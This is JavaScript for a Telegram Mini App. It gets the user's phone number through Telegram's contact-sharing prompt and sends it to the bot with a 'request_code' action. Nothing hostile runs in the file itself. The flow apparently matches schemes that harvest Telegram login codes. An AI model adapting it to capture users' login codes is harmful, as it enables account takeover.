const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

let authData = {
    phone: '',
    isProcessing: false
};

function showStep(stepId) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(stepId).classList.add('active');
    
    if (stepId === 'welcome-step') {
        tg.BackButton.hide();
    } else if (stepId === 'phone-confirm-step') {
        tg.BackButton.show();
    } else {
        tg.BackButton.hide();
    }
}

function requestPhoneNumber() {
    if (authData.isProcessing) {
        console.log('⏳ Already processing, skipping...');
        return;
    }

    console.log('📱 Requesting phone number via Telegram...');
    
    tg.requestContact((status, data) => {
        console.log('📞 Contact request response:', status, data);
        
        if (status && data.responseUnsafe?.contact?.phone_number) {
            let phone = data.responseUnsafe.contact.phone_number;
            
            if (!phone.startsWith('+')) {
                phone = '+' + phone;
            }
            
            authData.phone = phone;
            document.getElementById('phone-display').textContent = phone;
            showStep('phone-confirm-step');
            console.log('✅ Phone received:', phone);
        } else {
            tg.showAlert('Не удалось получить номер телефона');
            console.error('❌ No phone in response');
        }
    });
}

function submitPhone() {
    if (authData.isProcessing) {
        console.log('⏳ Already processing phone submission');
        return;
    }

    if (!authData.phone) {
        tg.showAlert('Номер телефона не получен');
        return;
    }

    console.log('🚀 Submitting phone:', authData.phone);
    authData.isProcessing = true;

    // Показываем загрузку
    showStep('loading-step');
    document.getElementById('loading-title').textContent = 'Отправка номера...';
    document.getElementById('loading-text').textContent = 'Ожидание ответа от бота';

    const payload = JSON.stringify({
        action: 'request_code',
        phone: authData.phone
    });

    console.log('📤 Payload:', payload);

    try {
        // Отправляем данные боту
        tg.sendData(payload);
        console.log('✅ Data sent, WebApp should close');
        
    } catch (error) {
        console.error('❌ Error:', error);
        authData.isProcessing = false;
        showError('Ошибка отправки: ' + error.message);
    }
}

function showError(message) {
    authData.isProcessing = false;
    document.getElementById('error-message').textContent = message;
    showStep('error-step');
}

// Обработка кнопки "Назад"
tg.BackButton.onClick(() => {
    showStep('welcome-step');
    authData.isProcessing = false;
});

// Скрываем главную кнопку
tg.MainButton.hide();

console.log('✅ Telegram WebApp initialized:', {
    version: tg.version,
    platform: tg.platform,
    initData: tg.initData ? 'Present' : 'Missing'
});
